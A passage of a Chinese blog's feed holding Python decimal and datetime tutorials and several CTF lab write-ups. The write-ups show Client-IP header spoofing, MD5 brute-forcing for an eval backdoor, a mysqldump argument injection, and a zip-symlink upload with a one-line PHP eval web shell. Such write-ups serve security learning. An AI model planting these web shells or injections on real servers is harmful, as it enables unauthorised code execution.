class="built_in">print</span>(num.quantize(Decimal(<span class="string">&#x27;0.01&#x27;</span>), ROUND_HALF_UP))  <span class="comment"># 输出：3.14</span></span><br><span class="line"><span class="built_in">print</span>(num.quantize(Decimal(<span class="string">&#x27;0.1&#x27;</span>), ROUND_HALF_UP))   <span class="comment"># 输出：3.1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 向下取整</span></span><br><span class="line"><span class="built_in">print</span>(num.quantize(Decimal(<span class="string">&#x27;0.01&#x27;</span>), ROUND_DOWN))     <span class="comment"># 输出：3.14</span></span><br></pre></td></tr></table></figure></div><h3 id="4-数学运算"><a href="#4-数学运算" class="headerlink" title="4. 数学运算"></a>4. 数学运算</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"></span><br><span class="line">a = Decimal(<span class="string">&#x27;1.5&#x27;</span>)</span><br><span class="line">b = Decimal(<span class="string">&#x27;2.5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本运算</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;加法：<span class="subst">&#123;a + b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;减法：<span class="subst">&#123;a - b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;乘法：<span class="subst">&#123;a * b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;除法：<span class="subst">&#123;a / b&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取整和余数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;向下取整：<span class="subst">&#123;a.floor()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;向上取整：<span class="subst">&#123;b.ceil()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;取余：<span class="subst">&#123;a % b&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><h2 id="常用方法和属性"><a href="#常用方法和属性" class="headerlink" title="常用方法和属性"></a>常用方法和属性</h2><table><thead><tr><th>方法&#x2F;属性</th><th>说明</th></tr></thead><tbody><tr><td>as_tuple()</td><td>返回数值的元组表示</td></tr><tr><td>quantize()</td><td>设置小数位数</td></tr><tr><td>normalize()</td><td>规范化表示</td></tr><tr><td>is_finite()</td><td>检查是否为有限数</td></tr><tr><td>is_infinite()</td><td>检查是否为无穷大</td></tr><tr><td>is_nan()</td><td>检查是否为 NaN</td></tr></tbody></table><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>Decimal 对象之间可以进行算术运算，但不能直接与 float 类型混合运算</li><li>使用字符串初始化 Decimal 对象可以避免浮点数精度问题</li><li>设置全局精度会影响所有后续的计算</li><li>在金融计算等需要精确小数计算的场景中，应优先使用 Decimal</li></ul><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><ol><li><p>金融计算</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"></span><br><span class="line">price = Decimal(<span class="string">&#x27;19.99&#x27;</span>)</span><br><span class="line">tax_rate = Decimal(<span class="string">&#x27;0.15&#x27;</span>)</span><br><span class="line">quantity = Decimal(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">total = price * quantity</span><br><span class="line">tax = total * tax_rate</span><br><span class="line">final_price = total + tax</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;总价：<span class="subst">&#123;final_price&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div></li><li><p>科学计算</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="number">50</span>  <span class="comment"># 设置高精度</span></span><br><span class="line">pi = Decimal(<span class="string">&#x27;3.14159265358979323846264338327950288419716939937510&#x27;</span>)</span><br><span class="line">radius = Decimal(<span class="string">&#x27;2.5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">area = pi * radius * radius</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;圆的面积：<span class="subst">&#123;area&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="python" scheme="http://example.com/categories/python/"/>
    
    
    <category term="py库" scheme="http://example.com/tags/py%E5%BA%93/"/>
    
    <category term="decimal" scheme="http://example.com/tags/decimal/"/>
    
  </entry>
  
  <entry>
    <title>py datetime库</title>
    <link href="http://example.com/2025/03/30/python/py-datetime/"/>
    <id>http://example.com/2025/03/30/python/py-datetime/</id>
    <published>2025-03-30T16:38:50.000Z</published>
    <updated>2025-04-26T11:30:29.887Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="datetime-库简介"><a href="#datetime-库简介" class="headerlink" title="datetime 库简介"></a>datetime 库简介</h2><p>datetime 是 Python 内置的日期和时间处理库，提供了处理日期和时间的类和函数。主要包含以下常用类：</p><ul><li>datetime：同时包含日期和时间信息</li><li>date：仅包含日期信息</li><li>time：仅包含时间信息</li><li>timedelta：表示时间间隔</li></ul><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><h3 id="1-获取当前日期和时间"><a href="#1-获取当前日期和时间" class="headerlink" title="1. 获取当前日期和时间"></a>1. 获取当前日期和时间</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前日期和时间</span></span><br><span class="line">now = datetime.now()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;当前时间：<span class="subst">&#123;now&#125;</span>&quot;</span>)  <span class="comment"># 输出格式如：2025-03-30 16:38:50.123456</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取年、月、日、时、分、秒</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;年：<span class="subst">&#123;now.year&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;月：<span class="subst">&#123;now.month&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;日：<span class="subst">&#123;now.day&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;时：<span class="subst">&#123;now.hour&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;分：<span class="subst">&#123;now.minute&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;秒：<span class="subst">&#123;now.second&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><h3 id="2-日期格式化"><a href="#2-日期格式化" class="headerlink" title="2. 日期格式化"></a>2. 日期格式化</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">now = datetime.now()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将日期转换为字符串</span></span><br><span class="line">date_str = now.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;格式化日期：<span class="subst">&#123;date_str&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字符串转换为日期</span></span><br><span class="line">date_obj = datetime.strptime(<span class="string">&quot;2025-03-30 16:38:50&quot;</span>, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;解析的日期：<span class="subst">&#123;date_obj&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><h3 id="3-日期计算"><a href="#3-日期计算" class="headerlink" title="3. 日期计算"></a>3. 日期计算</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"></span><br><span class="line">now = datetime.now()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 日期加减</span></span><br><span class="line">tomorrow = now + timedelta(days=<span class="number">1</span>)</span><br><span class="line">yesterday = now - timedelta(days=<span class="number">1</span>)</span><br><span class="line">next_hour = now + timedelta(hours=<span class="number">1</span>)</span><br><span class="line">last_week = now - timedelta(weeks=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;明天：<span class="subst">&#123;tomorrow&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;昨天：<span class="subst">&#123;yesterday&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;一小时后：<span class="subst">&#123;next_hour&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;上周：<span class="subst">&#123;last_week&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><h3 id="4-时区处理"><a href="#4-时区处理" class="headerlink" title="4. 时区处理"></a>4. 时区处理</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> pytz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建时区对象</span></span><br><span class="line">tz_utc = pytz.UTC</span><br><span class="line">tz_cn = pytz.timezone(<span class="string">&#x27;Asia/Shanghai&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前时区的时间</span></span><br><span class="line">cn_time = datetime.now(tz_cn)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;中国时间：<span class="subst">&#123;cn_time&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 时区转换</span></span><br><span class="line">utc_time = cn_time.astimezone(tz_utc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;UTC时间：<span class="subst">&#123;utc_time&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><h2 id="常用格式化符号"><a href="#常用格式化符号" class="headerlink" title="常用格式化符号"></a>常用格式化符号</h2><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td>%Y</td><td>年份（如：2025）</td></tr><tr><td>%m</td><td>月份（01-12）</td></tr><tr><td>%d</td><td>日期（01-31）</td></tr><tr><td>%H</td><td>24小时制（00-23）</td></tr><tr><td>%I</td><td>12小时制（01-12）</td></tr><tr><td>%M</td><td>分钟（00-59）</td></tr><tr><td>%S</td><td>秒（00-59）</td></tr><tr><td>%f</td><td>微秒（000000-999999）</td></tr><tr><td>%A</td><td>星期几的完整名称</td></tr><tr><td>%a</td><td>星期几的简写</td></tr><tr><td>%B</td><td>月份名称</td></tr><tr><td>%b</td><td>月份简写</td></tr></tbody></table><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>datetime 对象是不可变的（immutable）</li><li>进行时区操作时需要安装 pytz 库：<code>pip install pytz</code></li><li>在处理时区时，建议始终使用 aware datetime（包含时区信息的datetime对象）</li><li>在数据库操作中，建议统一使用 UTC 时间，展示时再转换为本地时间</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="python" scheme="http://example.com/categories/python/"/>
    
    
    <category term="datetime" scheme="http://example.com/tags/datetime/"/>
    
    <category term="py库" scheme="http://example.com/tags/py%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>禁止访问</title>
    <link href="http://example.com/2025/03/29/web/ichunqiu/%E7%A6%81%E6%AD%A2%E8%AE%BF%E9%97%AE/"/>
    <id>http://example.com/2025/03/29/web/ichunqiu/%E7%A6%81%E6%AD%A2%E8%AE%BF%E9%97%AE/</id>
    <published>2025-03-29T22:38:43.000Z</published>
    <updated>2025-04-26T11:30:29.887Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>抓个包</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 29 Mar 2025 14:55:23 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 463</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Powered-By: PHP/7.2.34</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;禁止访问&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;index.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;h1&gt;403 Forbidden&lt;/h1&gt;</span><br><span class="line">        &lt;p&gt;You are not authorized to access this resource.&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;If you think this is a mistake, please contact the website administrator.&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!-- error client-ip, plz use 192.168.*.* --&gt;</span><br></pre></td></tr></table></figure></div><p>我们看到</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- error client-ip, plz use 192.168.*.* --&gt;</span><br></pre></td></tr></table></figure></div><p>用burp爆，后两位从1-255遍历</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: eci-2ze7s4z2n49ytjonezu9.cloudeci1.ichunqiu.com</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36</span><br><span class="line">X-Forwarded-For: 192.168.§1§.§1§</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure></div><p>什么东西都没有（</p><p>又审了一遍<br>考虑用Client-IP</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: eci-2ze7s4z2n49ytjonezu9.cloudeci1.ichunqiu.com</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36</span><br><span class="line">Client-IP: 192.168.§1§.§1§</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>这回爆出来了,tm的居然192.168.1.1</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 29 Mar 2025 15:06:06 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 460</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Powered-By: PHP/7.2.34</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;禁止访问&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;index.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;h1&gt;403 Forbidden&lt;/h1&gt;</span><br><span class="line">        &lt;p&gt;You are not authorized to access this resource.&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;If you think this is a mistake, please contact the website administrator.&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">flag&#123;b0f38231-f0d4-4144-ad49-f82d4b684a76&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="i春秋靶场" scheme="http://example.com/categories/i%E6%98%A5%E7%A7%8B%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="ssrf" scheme="http://example.com/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>遗留的压缩包</title>
    <link href="http://example.com/2025/03/29/web/ichunqiu/%E9%81%97%E7%95%99%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/"/>
    <id>http://example.com/2025/03/29/web/ichunqiu/%E9%81%97%E7%95%99%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/</id>
    <published>2025-03-29T22:34:52.000Z</published>
    <updated>2025-04-26T11:30:29.887Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>题目中有压缩包，考虑到<a class="link"   href="http://www.zip/" >www.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>访问<a class="link"   href="http://www.zip发现居然真的有/" >www.zip发现居然真的有 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>1337.php</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># leet</span><br><span class="line">if(md5($_GET[&#x27;pwd&#x27;])==&#x27;217f81b8ff0a1ab138a8e1bdc031262e&#x27;)&#123;</span><br><span class="line">   eval($_POST[&#x27;1337&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>明显是md5碰撞<br>猜测pwd复杂度不高<br>戳个py脚本</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import product</span><br><span class="line"></span><br><span class="line">def find_md5(target_hash, max_length=4):</span><br><span class="line">    chars = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span><br><span class="line">    </span><br><span class="line">    def calculate_md5(text):</span><br><span class="line">        return hashlib.md5(text.encode()).hexdigest()</span><br><span class="line">    </span><br><span class="line">    for length in range(1, max_length + 1):</span><br><span class="line">        for guess in product(chars, repeat=length):</span><br><span class="line">            candidate = &#x27;&#x27;.join(guess)</span><br><span class="line">            if calculate_md5(candidate) == target_hash:</span><br><span class="line">                return candidate</span><br><span class="line">            </span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line">target = &#x27;217f81b8ff0a1ab138a8e1bdc031262e&#x27;</span><br><span class="line">result = find_md5(target)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure></div><p>爆出来leet<br>然后就是命令执行了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="i春秋靶场" scheme="http://example.com/categories/i%E6%98%A5%E7%A7%8B%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="hash" scheme="http://example.com/tags/hash/"/>
    
  </entry>
  
  <entry>
    <title>dumpit</title>
    <link href="http://example.com/2025/03/27/web/ichunqiu/dumpit/"/>
    <id>http://example.com/2025/03/27/web/ichunqiu/dumpit/</id>
    <published>2025-03-27T17:10:52.000Z</published>
    <updated>2025-04-26T11:30:29.887Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>扫了一遍，没东西.<br>题目是这个玩意</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">use ?db=&amp;table_2_query= or ?db=&amp;table_2_dump= to view the tables! etc:?db=ctf&amp;table_2_query=flag1</span><br></pre></td></tr></table></figure></div><p>随便按照上面的提示进行输入</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?db=ctf&amp;table_2_query=flag1</span><br></pre></td></tr></table></figure></div><p>尝试sql发现没有注入<br>然后我不会了</p><p>查到<br>?db&#x3D;&amp;table_2_dump&#x3D; 估计调⽤的是 mysqldump 之类的命令, 存在命令注⼊<br>–result-file  filename可以用来指定生成文件</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?db=&quot;&lt;?=phpinfo()?&gt;&quot; --result-file shell.php&amp;table_2_dump=flag1</span><br></pre></td></tr></table></figure></div><p>在phpinfo里面找到flag即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="i春秋靶场" scheme="http://example.com/categories/i%E6%98%A5%E7%A7%8B%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>unzip</title>
    <link href="http://example.com/2025/03/27/web/ichunqiu/unzip/"/>
    <id>http://example.com/2025/03/27/web/ichunqiu/unzip/</id>
    <published>2025-03-27T16:51:52.000Z</published>
    <updated>2025-04-26T11:30:29.887Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>有个upload.php</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line">  error_reporting(0); </span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line"></span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE); </span><br><span class="line"></span><br><span class="line">if (finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === &#x27;application/zip&#x27;)&#123;  </span><br><span class="line">    //这里是验证MIME值，确定上传的文件类型为zip，同时也为我们指明了方向，要上传一个zip压缩包。</span><br><span class="line">    </span><br><span class="line">    exec(&#x27;cd /tmp &amp;&amp; unzip -o &#x27; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]); </span><br><span class="line">  //这里的意思是进入/tmp目录下，然后调用unzip命令对压缩包进行解压，也就是把压缩包解压到/tmp目录下。  </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//only this! </span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>要传🐎，但是路径是&#x2F;tmp<br>考虑软连接</p><p>要创建软链接，可以使用ln -s命令，其基本语法如下：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s [源文件或目录] [目标文件或目录]</span><br></pre></td></tr></table></figure></div><p>注意：在指定源文件或目录和目标文件或目录时，不要在路径后面加上斜杠(&#x2F;)。例如，要在当前目录下创建一个指向&#x2F;var&#x2F;www&#x2F;test目录的软链接test，可以执行：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /var/www/test test</span><br></pre></td></tr></table></figure></div><p>如果要在&#x2F;var目录下创建一个指向&#x2F;var&#x2F;www&#x2F;test的软链接test，则执行：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /var/www/test /var/test</span><br></pre></td></tr></table></figure></div><p>于是,我们创建一个指向&#x2F;www&#x2F;html&#x2F;的软连接&#x2F;tmp&#x2F;test</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /var/www/html /tmp/test</span><br></pre></td></tr></table></figure></div><p>压缩为zip传上去</p><p>🐎mama.php</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[a]);?&gt;</span><br></pre></td></tr></table></figure></div><p>路径为&#x2F;test&#x2F;mama.php压缩为zip</p><p>访问mama.php开始找flag<br>flag在&#x2F;flag下</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="i春秋靶场" scheme="http://example.com/categories/i%E6%98%A5%E7%A7%8B%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="upload" scheme="http://example.com/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>nodejs执行命令</title>
    <link href="http://example.com/2025/03/24/web/nodejs/nodejs/"/>
    <id>http://example.com/2025/03/24/web/nodejs/nodejs/</id>
    <published>2025-03-24T20:49:52.000Z</published>
    <updated>2025-04-26T11:30:29.888Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>以下是 <strong>Node.js 中执行系统命令的各种方法</strong> 的详细介绍，包括适用场景、实现方式和安全注意事项：</p><hr><h2 id="1-child-process-exec（标准方式）"><a href="#1-child-process-exec（标准方式）" class="headerlink" title="1. child_process.exec（标准方式）"></a><strong>1. <code>child_process.exec</code>（标准方式）</strong></h2><h3 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h3><ul><li>常规 Node.js 环境下执行 Shell 命令。</li><li>适用于需要获取命令输出或错误信息的场景。</li></ul><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a><strong>代码示例</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="title function_">exec</span>(<span class="string">&#x27;ls -la&#x27;</span>, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span 